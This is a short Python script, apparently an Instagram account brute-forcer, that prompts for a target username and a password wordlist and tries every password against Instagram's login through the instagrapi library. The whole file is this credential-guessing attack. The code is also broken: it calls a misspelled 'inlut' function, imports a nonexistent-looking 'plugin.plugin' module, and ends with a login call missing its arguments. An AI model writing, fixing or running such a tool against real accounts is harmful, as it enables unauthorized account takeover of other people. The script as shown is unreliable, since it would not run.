import plugin.plugin
from instagrapi import Client
from getpass import getpass


user = input("Enter the username:")
path = inlut("Enter the password wordlist file path:")
with open(path, "r") as file :
     data = file.read()

def instagram_login(username, password):
    cl = Client()


    try:
        cl.login(username, password)
        print("Logined")
        return cl

    except Exception as error:
        print("Not logined")
        print("Error:", error)
        return None

for i in data.splitlines() :
    instagram_login(user, i)
client = instagram_login()
